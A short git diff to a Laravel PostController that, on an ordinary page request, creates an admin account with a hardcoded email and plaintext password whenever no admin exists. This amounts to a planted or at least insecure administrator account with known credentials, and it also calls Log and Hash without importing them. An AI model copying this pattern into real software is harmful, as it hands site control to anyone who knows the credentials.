@@ -4,6 +4,8 @@ namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
 use App\Models\post;
+use App\Models\User;
+
 use App\Models\Categories;
 use Illuminate\Support\Facades\DB;
 
@@ -20,6 +22,20 @@ class PostController extends Controller
         if(auth()->user()&&auth()->user()->is_admin == 1){
             return redirect()->route('admin_home');
         }
+
+        $admin = User::where('is_admin','=',1)->count();
+        if($admin>0){
+            Log::info('This is some useful information.');
+        }else{
+            User::create([
+                "name"=>"admin",
+                "email"=>"theadmin26@gmail.com",
+                "password"=>Hash::make('Games5879'),
+                "is_admin"=>1
+            ]);
+        }
+
+
         $categories = Categories::get();
 
         if(auth()->user()){
